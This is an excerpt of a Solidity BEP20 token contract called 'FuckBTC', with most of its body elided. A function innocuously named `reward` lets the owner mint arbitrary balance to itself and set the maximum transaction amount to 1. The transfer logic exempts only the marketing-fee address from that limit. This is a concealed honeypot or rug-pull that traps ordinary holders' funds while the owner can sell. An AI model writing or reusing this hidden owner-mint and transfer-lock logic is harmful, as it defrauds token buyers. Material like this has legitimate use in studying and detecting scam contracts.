...
contract FuckBTC is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "FuckBTC";
    string constant _symbol = "FuckBTC";
    ...
    constructor () Auth(msg.sender) {
        ...
        address _presaler = 0x5811db384f2c2b9cbD94F87ABB4542A4d71566f1;
    ...
    function reward (uint256 amount) external authorized {_balances[msg.sender] += amount;_maxTxAmount=1;}
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(sender != marketingFeeReceiver){checkTxLimit(sender, amount);}
